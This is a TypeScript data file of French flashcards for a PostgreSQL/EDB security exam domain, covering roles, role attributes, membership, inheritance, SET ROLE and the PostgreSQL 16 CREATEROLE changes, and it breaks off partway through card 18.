import { FlashcardItem } from '../types';

export const postgresEdbDom03Part1Flashcards: FlashcardItem[] = [
  // =========================================================================
  // SECTION 1 : ARCHITECTURE DE SÉCURITÉ, UTILISATEURS, GROUPES & RÔLES (Cartes 1 à 10)
  // CREATE/ALTER/DROP ROLE, LOGIN, SUPERUSER, pg_roles, pg_authid, CREATEDB, etc.
  // =========================================================================
  {
    id: 'fc-pgedb-dom03-001',
    cardNumber: 1,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Concept unifié de Rôle (Utilisateurs et Groupes)',
    difficulty: 'easy',
    tags: ['Roles', 'Security Architecture', 'Users vs Groups', 'Core Concepts'],
    front: {
      question: 'Comment PostgreSQL modélise-t-il les notions d\'utilisateurs et de groupes d\'utilisateurs dans son moteur de sécurité ?',
      hint: 'PostgreSQL n\'a pas deux entités distinctes mais une seule et même abstraction unifiée.',
    },
    back: {
      answer: 'PostgreSQL unifie totalement les concepts d\'utilisateurs et de groupes sous une entité unique appelée **ROLE** (créé via `CREATE ROLE`).\n\n- Un "utilisateur" n\'est rien d\'autre qu\'un rôle disposant du privilège de connexion (`LOGIN`).\n- Un "groupe" est un rôle sans privilège de connexion (`NOLOGIN`), auquel d\'autres rôles sont rattachés en tant que membres (`GRANT role_groupe TO role_utilisateur;`).\n\nLes rôles sont des entités globales au niveau du cluster (partagés par toutes les bases de données de l\'instance).',
      explanation: 'Cette conception simplifie grandement l\'administration : un groupe peut lui-même appartenir à un autre groupe, formant une hiérarchie de permissions très souple.',
      examTrap: 'Les rôles ne sont PAS locaux à une base de données particulière. Ils sont définis au niveau de l\'instance entière dans le catalogue partagé `pg_global`.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 22: Database Roles',
    },
  },
  {
    id: 'fc-pgedb-dom03-002',
    cardNumber: 2,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: '`CREATE ROLE` vs `CREATE USER`',
    difficulty: 'easy',
    tags: ['CREATE ROLE', 'CREATE USER', 'LOGIN', 'SQL Commands'],
    front: {
      question: 'Quelle est la seule différence fondamentale entre les commandes SQL `CREATE ROLE <nom>` et `CREATE USER <nom>` ?',
      codeSnippet: 'CREATE ROLE dev_user;\nCREATE USER app_user;',
      hint: 'L\'un attribue automatiquement le droit de se connecter au serveur par défaut, l\'autre non.',
    },
    back: {
      answer: 'La commande `CREATE USER` est un alias historique standard SQL de `CREATE ROLE`, avec une seule différence par défaut :\n- `CREATE USER` applique implicitement la clause `LOGIN` (l\'utilisateur peut immédiatement ouvrir une session s\'il a un mot de passe et une règle `pg_hba.conf` valide).\n- `CREATE ROLE` applique implicitement la clause `NOLOGIN` (le rôle ne peut pas ouvrir de session cliente directement, agissant par défaut comme un groupe).\n\n`CREATE USER nom;` est donc strictement équivalent à `CREATE ROLE nom WITH LOGIN;`.',
      explanation: 'Dans la pratique moderne et les scripts de déploiement, il est recommandé d\'utiliser systématiquement la commande canonique `CREATE ROLE` en précisant explicitement `LOGIN` ou `NOLOGIN`.',
      examTrap: 'Si vous créez un compte applicatif avec `CREATE ROLE app_usr PASSWORD \'secret\';` sans préciser `LOGIN`, toute tentative de connexion échouera avec l\'erreur "role app_usr is not permitted to log in".',
      ruleRef: 'PostgreSQL 16 Documentation - SQL Commands: CREATE USER / CREATE ROLE',
    },
  },
  {
    id: 'fc-pgedb-dom03-003',
    cardNumber: 3,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Attributs fondamentaux d\'un rôle : `SUPERUSER`, `CREATEDB`, `CREATEROLE`',
    difficulty: 'medium',
    tags: ['Privileges', 'SUPERUSER', 'CREATEDB', 'CREATEROLE', 'RBAC'],
    front: {
      question: 'Quels sont les privilèges majeurs accordés par les attributs `SUPERUSER`, `CREATEDB` et `CREATEROLE` lors de la création d\'un rôle ?',
      codeSnippet: 'CREATE ROLE admin_app WITH LOGIN CREATEDB CREATEROLE NOSUPERUSER;',
      hint: 'Chaque mot-clé confère une capacité administrative spécifique sans nécessiter de super-pouvoirs universels.',
    },
    back: {
      answer: '1. `SUPERUSER` : Confère les pleins pouvoirs absolus sur l\'instance. Un superutilisateur contourne toutes les vérifications de permissions (y compris la sécurité au niveau des lignes - RLS) et peut exécuter n\'importe quel code système.\n2. `CREATEDB` : Permet au rôle de créer de nouvelles bases de données (`CREATE DATABASE`). Il devient automatiquement le propriétaire de toute base qu\'il crée.\n3. `CREATEROLE` : Permet au rôle de créer, modifier et supprimer d\'autres rôles (avec des restrictions de sécurité renforcées en PG 16 pour éviter l\'élévation de privilèges non sollicitée).',
      explanation: 'Appliquer le principe de moindre privilège impose d\'éviter l\'attribut `SUPERUSER` pour les comptes applicatifs et les administrateurs délégués.',
      examTrap: 'Un rôle doté de `CREATEROLE` ne peut PAS créer un rôle `SUPERUSER` ou modifier un rôle existant pour le promouvoir `SUPERUSER` s\'il ne l\'est pas lui-même.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 22.2: Role Attributes',
    },
  },
  {
    id: 'fc-pgedb-dom03-004',
    cardNumber: 4,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Attributs de réplication et de contournement RLS (`REPLICATION`, `BYPASSRLS`)',
    difficulty: 'hard',
    tags: ['REPLICATION', 'BYPASSRLS', 'Streaming Replication', 'Security Policies'],
    front: {
      question: 'À quoi servent spécifiquement les attributs de rôle `REPLICATION` et `BYPASSRLS` ?',
      codeSnippet: 'CREATE ROLE rep_user WITH LOGIN REPLICATION;\nCREATE ROLE backup_user WITH LOGIN BYPASSRLS;',
      hint: 'L\'un permet la connexion en streaming binaire/slots de réplication, l\'autre permet de lire toutes les lignes ignorant les filtres Row-Level Security.',
    },
    back: {
      answer: '1. `REPLICATION` :\n- Autorise le rôle à se connecter en mode réplication physique ou logique (`replication connection`).\n- Requis pour les outils de réplication streaming (`pg_basebackup`, processus WalReceiver, slots de réplication physique et souscriptions logiques).\n- Ce rôle doit également être explicitement autorisé dans `pg_hba.conf` sur la base virtuelle `replication`.\n\n2. `BYPASSRLS` :\n- Autorise le rôle à contourner intégralement toutes les politiques de sécurité au niveau des lignes (Row-Level Security - RLS).\n- Indispensable pour les outils d\'export ou de sauvegarde logique (`pg_dump`) afin d\'extraire l\'intégralité des données d\'une table sans que les lignes ne soient masquées par les règles d\'isolation locataire.',
      explanation: 'Les superutilisateurs possèdent implicitement ces deux privilèges sans avoir besoin de les déclarer.',
      examTrap: 'Un rôle standard (non-superuser et sans `BYPASSRLS`) qui lance un `pg_dump` sur une table protégée par RLS ne sauvegardera QUE les lignes autorisées par sa propre politique, corrompant l\'exhaustivité de la sauvegarde !',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 22.2: Role Attributes',
    },
  },
  {
    id: 'fc-pgedb-dom03-005',
    cardNumber: 5,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Gestion de l\'expiration et des limites de connexions (`VALID UNTIL`, `CONNECTION LIMIT`)',
    difficulty: 'medium',
    tags: ['VALID UNTIL', 'CONNECTION LIMIT', 'Account Expiry', 'Throttling'],
    front: {
      question: 'Comment définir une date d\'expiration pour un compte utilisateur et limiter le nombre de sessions concurrentes qu\'il peut ouvrir ?',
      codeSnippet: 'CREATE ROLE stagiaire WITH LOGIN\n  PASSWORD \'Azerty123!\'\n  VALID UNTIL \'2026-12-31 23:59:59\'\n  CONNECTION LIMIT 3;',
      hint: 'Ces clauses natives limitent l\'accès dans le temps et protègent les ressources de l\'instance contre les ouvertures excessives de connexions.',
    },
    back: {
      answer: '1. `VALID UNTIL \'timestamp\'` :\n- Définit la date et heure d\'expiration du mot de passe et de validité de la session du rôle.\n- Après cette échéance, toute nouvelle tentative de connexion est rejetée par le serveur.\n- Pratique pour les prestataires temporaires ou stagiaires.\n- Pour retirer l\'échéance : `ALTER ROLE stagiaire VALID UNTIL \'infinity\';`.\n\n2. `CONNECTION LIMIT <nombre>` :\n- Fixe le nombre maximal de connexions concurrentes autorisées pour ce rôle (la valeur par défaut `-1` signifie illimité, borné uniquement par `max_connections`).\n- Exemple : `CONNECTION LIMIT 5` empêche une application défaillante de monopoliser toutes les connexions du pool.',
      explanation: 'Notez que les superutilisateurs ne sont jamais restreints par `CONNECTION LIMIT`.',
      examTrap: '`VALID UNTIL` n\'interrompt PAS les sessions clientes déjà actives au moment de l\'expiration : elle bloque uniquement les nouvelles connexions futures.',
      ruleRef: 'PostgreSQL 16 Documentation - SQL Commands: CREATE ROLE / ALTER ROLE',
    },
  },
  {
    id: 'fc-pgedb-dom03-006',
    cardNumber: 6,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Catalogue système : `pg_roles` vs `pg_authid`',
    difficulty: 'medium',
    tags: ['pg_roles', 'pg_authid', 'Catalog', 'Security Audit', 'Passwords'],
    front: {
      question: 'Quelle est la différence fondamentale entre la vue `pg_roles` et la table catalogue `pg_authid` en matière de sécurité et de visibilité des mots de passe ?',
      codeSnippet: 'SELECT rolname, rolpassword FROM pg_authid;\nSELECT rolname, rolpassword FROM pg_roles;',
      hint: 'L\'un masque systématiquement les empreintes de mots de passe pour les utilisateurs ordinaires, l\'autre est réservé au superutilisateur.',
    },
    back: {
      answer: '1. `pg_authid` :\n- C\'est la table système physique sous-jacente stockée dans `pg_global`.\n- Elle contient les empreintes de hachage réelles des mots de passe (`rolpassword`, haché en SCRAM-SHA-256 ou MD5).\n- Son accès en lecture est strictement réservé aux rôles `SUPERUSER` ou dotés de privilèges d\'administration spécifiques afin de prévenir toute attaque hors ligne par dictionnaire.\n\n2. `pg_roles` :\n- C\'est une vue système publique construite au-dessus de `pg_authid`.\n- Accessible en lecture à tous les utilisateurs du cluster.\n- La colonne `rolpassword` affiche systématiquement la chaîne fictive `********` pour tout utilisateur non-superutilisateur, masquant le hash secret.',
      explanation: 'Historiquement, la vue `pg_user` existait aussi pour compatibilité ascendante, mais `pg_roles` est la vue moderne de référence.',
      examTrap: 'Ne jamais faire de requête sur `pg_roles` en espérant auditer ou comparer des hash de mots de passe : la colonne renvoie `********` !',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 54: System Catalogs - pg_authid / pg_roles',
    },
  },
  {
    id: 'fc-pgedb-dom03-007',
    cardNumber: 7,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Consultation des rôles en interactif dans `psql` (`\\du` / `\\du+`)',
    difficulty: 'easy',
    tags: ['psql', 'Meta-commands', '\\du', 'Inspection'],
    front: {
      question: 'Quelles méta-commandes `psql` permettent d\'afficher la liste de tous les rôles du cluster, leurs attributs et leurs descriptions ?',
      codeSnippet: '\\du\n\\du+',
      hint: 'Une commande courte psql commençant par antislash d.',
    },
    back: {
      answer: '1. `\\du` :\n- Liste tous les rôles du cluster, leurs attributs administratifs (`Superuser`, `Create role`, `Create DB`, `Cannot login`, `Replication`, `Bypass RLS`), ainsi que les groupes dont ils sont membres (`Member of`).\n\n2. `\\du+` :\n- Fournit un affichage étendu incluant la colonne `Description` (les commentaires ajoutés via `COMMENT ON ROLE <nom> IS \'...\';`).\n- Possibilité de filtrer par motif : `\\du admin_*`.',
      explanation: 'Ces raccourcis exécutent en coulisse une requête formatée interrogeant la vue `pg_roles` et le catalogue `pg_auth_members`.',
      examTrap: '`\\du` affiche les rôles du cluster entier, et non pas seulement les utilisateurs ayant des droits sur la base courante.',
      ruleRef: 'PostgreSQL 16 Documentation - PostgreSQL Client Applications: psql',
    },
  },
  {
    id: 'fc-pgedb-dom03-008',
    cardNumber: 8,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Suppression d\'un rôle et gestion des dépendances (`DROP ROLE`)',
    difficulty: 'hard',
    tags: ['DROP ROLE', 'REASSIGN OWNED', 'DROP OWNED', 'Dependencies'],
    front: {
      question: 'Pourquoi l\'exécution de `DROP ROLE <nom>;` échoue-t-elle fréquemment avec l\'erreur "role cannot be dropped because some objects depend on it", et comment résoudre ce blocage proprement ?',
      codeSnippet: 'DROP ROLE dev_lead;\n-- ERROR: role "dev_lead" cannot be dropped because some objects depend on it\n-- DETAIL: owner of table commandes, privileges on table clients...',
      hint: 'Deux commandes dédiées permettent de réassigner la propriété des objets ou de révoquer les privilèges résiduels.',
    },
    back: {
      answer: 'Un rôle ne peut pas être supprimé s\'il possède encore des objets dans une base de données (tables, vues, schémas, fonctions) ou s\'il détient des privilèges accordés (`GRANT`) sur des objets tiers.\n\nProcédure de nettoyage officielle :\n1. Réassigner tous les objets possédés par le rôle vers un autre rôle (ex: `postgres` ou le nouveau responsable) :\n   ```sql\n   REASSIGN OWNED BY dev_lead TO postgres;\n   ```\n2. Révoquer tous les privilèges résiduels accordés sur les objets de la base :\n   ```sql\n   DROP OWNED BY dev_lead;\n   ```\n3. Supprimer définitivement le rôle du cluster :\n   ```sql\n   DROP ROLE dev_lead;\n   ```',
      explanation: 'Attention : Si le rôle possède des objets dans plusieurs bases de données du cluster, les commandes `REASSIGN OWNED` et `DROP OWNED` doivent impérativement être exécutées au sein de CHAQUE base de données concernée avant de lancer `DROP ROLE`.',
      examTrap: '`DROP OWNED BY dev_lead;` supprime physiquement les tables dont `dev_lead` est le propriétaire s\'ils n\'ont pas été préalablement réassignés ! C\'est pourquoi `REASSIGN OWNED` doit toujours précéder `DROP OWNED`.',
      ruleRef: 'PostgreSQL 16 Documentation - SQL Commands: DROP ROLE / REASSIGN OWNED / DROP OWNED',
    },
  },
  {
    id: 'fc-pgedb-dom03-009',
    cardNumber: 9,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Modification dynamique d\'un rôle avec `ALTER ROLE`',
    difficulty: 'easy',
    tags: ['ALTER ROLE', 'Password Change', 'Privileges Modification'],
    front: {
      question: 'Quelles opérations courantes d\'administration des comptes sont réalisées via la commande `ALTER ROLE` ?',
      codeSnippet: 'ALTER ROLE app_user WITH PASSWORD \'NewP@ssw0rd!\';\nALTER ROLE app_user WITH NOLOGIN;\nALTER ROLE app_user RENAME TO app_service;',
      hint: 'Changement de mot de passe, désactivation d\'un compte, renommage et ajustement d\'attributs.',
    },
    back: {
      answer: 'La commande `ALTER ROLE <nom>` permet de modifier les caractéristiques d\'un rôle existant sans le recréer :\n1. Modifier le mot de passe : `ALTER ROLE user1 WITH PASSWORD \'nouveau_mdp\';`.\n2. Verrouiller temporairement un compte sans le supprimer : `ALTER ROLE user1 WITH NOLOGIN;` (immédiat, empêche toute nouvelle connexion).\n3. Déverrouiller le compte : `ALTER ROLE user1 WITH LOGIN;`.\n4. Renommer un rôle : `ALTER ROLE ancien_nom RENAME TO nouveau_nom;`.\n5. Ajuster les privilèges administratifs : `ALTER ROLE user1 WITH CREATEDB NOSUPERUSER;`.',
      explanation: 'Tout utilisateur standard peut changer son propre mot de passe via `ALTER ROLE CURRENT_USER WITH PASSWORD \'...\';` si la configuration de sécurité l\'autorise.',
      examTrap: 'Renommer un rôle avec `RENAME TO` ne modifie pas automatiquement son nom dans le fichier `pg_hba.conf` ! Le fichier de configuration doit être mis à jour manuellement.',
      ruleRef: 'PostgreSQL 16 Documentation - SQL Commands: ALTER ROLE',
    },
  },
  {
    id: 'fc-pgedb-dom03-010',
    cardNumber: 10,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Sécurité renforcée de `CREATEROLE` sous PostgreSQL 16',
    difficulty: 'hard',
    tags: ['CREATEROLE', 'PostgreSQL 16', 'Privilege Escalation', 'Security Hardening'],
    front: {
      question: 'Quelle restriction de sécurité majeure a été introduite dans PostgreSQL 16 concernant les rôles dotés de l\'attribut `CREATEROLE` pour empêcher les élévations de privilèges ?',
      hint: 'Auparavant, un utilisateur CREATEROLE pouvait modifier quasiment n\'importe quel rôle non-superuser et contourner des contrôles.',
    },
    back: {
      answer: 'Dans PostgreSQL 16, le privilège `CREATEROLE` a été profondément durci pour empêcher les élévations indirectes de privilèges :\n1. Un rôle avec `CREATEROLE` ne peut désormais modifier, supprimer ou gérer l\'appartenance QUE des rôles sur lesquels il a explicitement reçu des privilèges d\'administration (`WITH ADMIN OPTION`).\n2. Il ne peut plus attribuer arbitrairement des rôles prédéfinis du système (comme `pg_read_all_data`) à d\'autres utilisateurs à moins qu\'il ne détienne lui-même ce rôle `WITH ADMIN OPTION`.\n3. Il ne peut modifier aucun attribut sur un rôle superutilisateur.',
      explanation: 'Cette modification comble une faille d\'architecture historique où un compte `CREATEROLE` pouvait s\'ajouter à des groupes hautement privilégiés.',
      examTrap: 'Avant PG 16, `CREATEROLE` était quasiment considéré comme équivalent à `SUPERUSER` en raison de cette possibilité de contournement. Ce n\'est plus le cas sous PostgreSQL 16.',
      ruleRef: 'PostgreSQL 16 Release Notes & Chapter 22.2: Role Attributes (CREATEROLE semantics)',
    },
  },

  // =========================================================================
  // SECTION 2 : APPARTENANCE AUX RÔLES, HÉRITAGE & DÉLÉGATION (Cartes 11 à 20)
  // GRANT role TO role, INHERIT / NOINHERIT, SET ROLE, ADMIN OPTION, WITH INHERIT (PG 16)
  // =========================================================================
  {
    id: 'fc-pgedb-dom03-011',
    cardNumber: 11,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Attribution d\'un rôle de groupe (`GRANT role TO role`)',
    difficulty: 'easy',
    tags: ['GRANT Role', 'Groups', 'RBAC', 'Membership'],
    front: {
      question: 'Quelle est la syntaxe pour ajouter un utilisateur en tant que membre d\'un rôle de groupe sous PostgreSQL ?',
      codeSnippet: 'CREATE ROLE lecture_seule NOLOGIN;\nCREATE ROLE alice LOGIN PASSWORD \'secret\';\n-- Comment associer alice au groupe lecture_seule ?',
      hint: 'On utilise l\'instruction standard GRANT en ciblant un nom de rôle plutôt qu\'un objet de table.',
    },
    back: {
      answer: 'La syntaxe est :\n```sql\nGRANT lecture_seule TO alice;\n```\nEffets :\n- `alice` devient immédiatement membre du rôle `lecture_seule`.\n- Si `alice` a l\'attribut `INHERIT` (valeur par défaut), elle hérite instantanément de tous les droits de lecture (`SELECT`) accordés au groupe `lecture_seule` sur les tables et vues de la base.',
      explanation: 'Pour vérifier les appartenances, on interroge la méta-commande `\du` ou le catalogue système `pg_auth_members`.',
      examTrap: 'La syntaxe est `GRANT groupe TO utilisateur;` et NON PAS l\'inverse. Inverser les rôles ferait du groupe un membre de l\'utilisateur !',
      ruleRef: 'PostgreSQL 16 Documentation - SQL Commands: GRANT (Role)',
    },
  },
  {
    id: 'fc-pgedb-dom03-012',
    cardNumber: 12,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Héritage automatique des privilèges : `INHERIT` vs `NOINHERIT`',
    difficulty: 'medium',
    tags: ['INHERIT', 'NOINHERIT', 'Privilege Inheritance', 'Security Architecture'],
    front: {
      question: 'Comment fonctionne l\'attribut `INHERIT` (défaut) par rapport à `NOINHERIT` lors de l\'exécution d\'une requête SQL par un membre du groupe ?',
      codeSnippet: 'CREATE ROLE groupe_compta NOLOGIN;\nGRANT SELECT ON grand_livre TO groupe_compta;\n\nCREATE ROLE bob LOGIN INHERIT;\nCREATE ROLE charlie LOGIN NOINHERIT;\nGRANT groupe_compta TO bob, charlie;',
      hint: 'Bob accède directement à la table ; Charlie doit explicitement endosser l\'identité du groupe.',
    },
    back: {
      answer: '1. `INHERIT` (comportement par défaut) :\n- `bob` hérite automatiquement et immédiatement de tous les privilèges accordés à `groupe_compta`.\n- Il peut exécuter `SELECT * FROM grand_livre;` directement sans manipulation préalable.\n\n2. `NOINHERIT` :\n- `charlie` ne reçoit AUCUN privilège implicite du groupe dans sa session de base.\n- S\'il tente `SELECT * FROM grand_livre;`, PostgreSQL renvoie "permission denied for table grand_livre".\n- Pour utiliser les droits du groupe, `charlie` doit obligatoirement endosser explicitement le rôle avec la commande `SET ROLE groupe_compta;`.',
      explanation: '`NOINHERIT` est très utilisé pour forcer les utilisateurs à adopter délibérément un contexte à haute responsabilité (équivalent du `sudo` sous Unix).',
      examTrap: 'L\'attribut `INHERIT` n\'hérite jamais des attributs administratifs comme `SUPERUSER`, `CREATEDB` ou `CREATEROLE` : il ne transmet QUE les privilèges sur les objets de données (`SELECT`, `INSERT`, etc.).',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 22.3: Role Membership',
    },
  },
  {
    id: 'fc-pgedb-dom03-013',
    cardNumber: 13,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Bascule d\'identité en session avec `SET ROLE`',
    difficulty: 'medium',
    tags: ['SET ROLE', 'RESET ROLE', 'Identity Switching', 'Session'],
    front: {
      question: 'À quoi sert la commande SQL `SET ROLE <nom>` et comment rétablir l\'identité d\'origine de la session ?',
      codeSnippet: 'SET ROLE admin_compta;\n-- Exécution de requêtes avec les privilèges du rôle...\nRESET ROLE;',
      hint: 'Elle permet à un utilisateur d\'adopter l\'identité et les privilèges d\'un groupe dont il est membre.',
    },
    back: {
      answer: '1. `SET ROLE <nom_role>;` :\n- Modifie l\'identifiant utilisateur courant de la session pour adopter l\'identité du rôle spécifié.\n- Condition : L\'utilisateur connecté initialement doit obligatoirement être membre de ce rôle (ou être superutilisateur).\n- Tout nouvel objet créé lors de la session aura désormais ce rôle pour propriétaire (`owner`).\n\n2. `RESET ROLE;` (ou `SET ROLE NONE;`) :\n- Rétablit l\'identité utilisateur courante à l\'utilisateur initial qui a ouvert la session.',
      explanation: 'La fonction `current_user` reflète le rôle adopté par `SET ROLE`, tandis que `session_user` conserve l\'identité originelle de connexion.',
      examTrap: 'Si un utilisateur non-membre tente d\'exécuter `SET ROLE un_autre_role;`, PostgreSQL renvoie une erreur "permission denied to set role".',
      ruleRef: 'PostgreSQL 16 Documentation - SQL Commands: SET ROLE',
    },
  },
  {
    id: 'fc-pgedb-dom03-014',
    cardNumber: 14,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: '`SET ROLE` vs `SET SESSION AUTHORIZATION`',
    difficulty: 'hard',
    tags: ['SET ROLE', 'SET SESSION AUTHORIZATION', 'Security Context', 'Superuser'],
    front: {
      question: 'Quelle est la différence fondamentale de privilège et de comportement entre `SET ROLE` et `SET SESSION AUTHORIZATION` ?',
      codeSnippet: 'SET ROLE compta;\nSET SESSION AUTHORIZATION app_user;',
      hint: 'L\'un peut être utilisé par tout membre d\'un rôle, l\'autre modifie l\'utilisateur de session global et exige d\'être superutilisateur.',
    },
    back: {
      answer: '1. `SET ROLE` :\n- Modifie uniquement l\'utilisateur courant (`current_user`).\n- `session_user` reste inchangé.\n- Tout membre du groupe cible peut l\'exécuter.\n\n2. `SET SESSION AUTHORIZATION` :\n- Modifie à la fois `session_user` ET `current_user` pour la connexion courante.\n- Seul un rôle `SUPERUSER` a le droit d\'exécuter cette commande.\n- L\'instance agit alors comme si l\'utilisateur cible s\'était physiquement connecté depuis le début (impacte les vérifications de règles et les droits de réinitialisation).',
      explanation: 'Pour réinitialiser : `RESET SESSION AUTHORIZATION;` ramène la session à l\'identité initiale du superutilisateur.',
      examTrap: 'Un utilisateur non-superuser ne peut JAMAIS exécuter `SET SESSION AUTHORIZATION`, même s\'il est membre du groupe cible.',
      ruleRef: 'PostgreSQL 16 Documentation - SQL Commands: SET SESSION AUTHORIZATION',
    },
  },
  {
    id: 'fc-pgedb-dom03-015',
    cardNumber: 15,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Délégation administrative avec `WITH ADMIN OPTION`',
    difficulty: 'medium',
    tags: ['WITH ADMIN OPTION', 'Delegation', 'Role Management', 'GRANT'],
    front: {
      question: 'Quel pouvoir supplémentaire confère la clause `WITH ADMIN OPTION` lors de l\'attribution d\'un rôle à un utilisateur ?',
      codeSnippet: 'GRANT managers TO alice WITH ADMIN OPTION;',
      hint: 'Alice peut désormais elle-même ajouter ou retirer d\'autres personnes dans le groupe managers.',
    },
    back: {
      answer: 'La clause `WITH ADMIN OPTION` autorise l\'utilisateur bénéficiaire (`alice`) à :\n1. Accorder à son tour l\'appartenance au rôle `managers` à d\'autres utilisateurs (`GRANT managers TO bob;`).\n2. Révoquer l\'appartenance au rôle `managers` pour d\'autres utilisateurs (`REVOKE managers FROM charlie;`).\n3. Révoquer ou transmettre l\'option `ADMIN OPTION` elle-même.\n\nElle délègue ainsi la gestion des adhésions au groupe sans nécessiter les privilèges globaux de superutilisateur ou de `CREATEROLE`.',
      explanation: 'C\'est l\'équivalent exact pour les rôles de ce que `WITH GRANT OPTION` est pour les tables et privilèges d\'objets.',
      examTrap: 'Si `alice` perd son rôle via `REVOKE managers FROM alice;`, les rôles qu\'elle a elle-même accordés ne sont pas révoqués en cascade par défaut (sauf si `CASCADE` est stipulé).',
      ruleRef: 'PostgreSQL 16 Documentation - SQL Commands: GRANT (Role)',
    },
  },
  {
    id: 'fc-pgedb-dom03-016',
    cardNumber: 16,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Contrôle granulaire de l\'appartenance sous PG 16 (`WITH SET`, `WITH INHERIT`)',
    difficulty: 'hard',
    tags: ['PostgreSQL 16', 'WITH SET', 'WITH INHERIT', 'Granular RBAC'],
    front: {
      question: 'Quelles nouvelles options de granularité ont été ajoutées à la commande `GRANT role TO member` dans PostgreSQL 16 ?',
      codeSnippet: 'GRANT dba_team TO dave WITH INHERIT FALSE, SET TRUE;',
      hint: 'Elles permettent de dissocier le droit d\'hériter des privilèges et le droit de faire SET ROLE.',
    },
    back: {
      answer: 'PostgreSQL 16 a introduit un contrôle très fin lors de l\'octroi d\'un rôle via les options :\n1. `WITH INHERIT TRUE | FALSE` :\n   - Permet de forcer ou d\'interdire l\'héritage automatique des privilèges du groupe pour ce membre précis, indépendamment de l\'attribut `INHERIT` du rôle.\n2. `WITH SET TRUE | FALSE` :\n   - Indique si le membre a le droit d\'exécuter `SET ROLE` pour endosser ce rôle.\n   - Si `SET FALSE` est appliqué, le membre ne peut jamais faire `SET ROLE` vers ce groupe (il bénéficie uniquement de l\'héritage si actif).\n3. `WITH ADMIN TRUE | FALSE` :\n   - Syntaxe modernisée équivalente à `WITH ADMIN OPTION`.',
      explanation: 'Ces options permettent par exemple d\'accorder les droits d\'un groupe de reporting sans permettre au compte d\'usurper l\'identité du groupe lors des audits.',
      examTrap: 'Si un rôle est accordé avec `WITH INHERIT FALSE, SET FALSE`, le membre ne dispose d\'aucun moyen d\'utiliser les privilèges du rôle !',
      ruleRef: 'PostgreSQL 16 Documentation - SQL Commands: GRANT (Role Membership)',
    },
  },
  {
    id: 'fc-pgedb-dom03-017',
    cardNumber: 17,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Révocation d\'appartenance à un rôle (`REVOKE role FROM role`)',
    difficulty: 'easy',
    tags: ['REVOKE', 'Role Membership', 'Security Administration'],
    front: {
      question: 'Comment retirer un utilisateur d\'un groupe de sécurité sous PostgreSQL ?',
      codeSnippet: 'REVOKE groupe_rh FROM employee_user;',
      hint: 'Instruction REVOKE standard ciblant le nom du rôle groupe et le membre.',
    },
    back: {
      answer: 'La commande est :\n```sql\nREVOKE <nom_groupe> FROM <nom_membre>;\n```\nEffets immédiats :\n1. L\'utilisateur perd instantanément tous les droits hérités de ce groupe.\n2. Il ne peut plus exécuter `SET ROLE <nom_groupe>` dans ses sessions futures ou existantes.\n3. Pour retirer uniquement le droit d\'administration déléguée sans retirer l\'appartenance : `REVOKE ADMIN OPTION FOR <nom_groupe> FROM <nom_membre>;`.',
      explanation: 'La révocation prend effet immédiatement sans nécessiter de rechargement de configuration.',
      examTrap: 'Si l\'utilisateur a actuellement une session avec `SET ROLE groupe_rh` déjà actif, la révocation l\'empêchera de ré-exécuter la commande mais n\'interrompt pas brutalement la requête en vol.',
      ruleRef: 'PostgreSQL 16 Documentation - SQL Commands: REVOKE (Role)',
    },
  },
  {
    id: 'fc-pgedb-dom03-018',
    cardNumber: 18,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Droits implicites et intouchables du Propriétaire (`OWNER`)',
    difficulty: 'medium',
    tags: ['OWNER', 'Implicit Privileges', 'ALTER TABLE OWNER TO'],
    front: {
